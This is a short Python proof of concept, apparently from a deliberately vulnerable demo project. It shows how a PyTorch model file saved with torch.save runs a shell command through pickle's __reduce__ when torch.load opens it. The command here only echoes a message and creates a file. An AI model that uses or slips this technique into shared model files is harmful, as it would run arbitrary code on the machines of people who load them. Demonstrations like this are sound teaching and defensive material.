import torch
import os

class MaliciousPayload(object):
    def __reduce__(self):
        return (os.system, ("echo 'pwned torch' && touch haxor_tensorflow.txt",))

# Serialize the Payload
torch.save(MaliciousPayload(), 'damn_vuln_torch_model.pt')

# Deserialize the Payload
torch.load('damn_vuln_torch_model.pt')
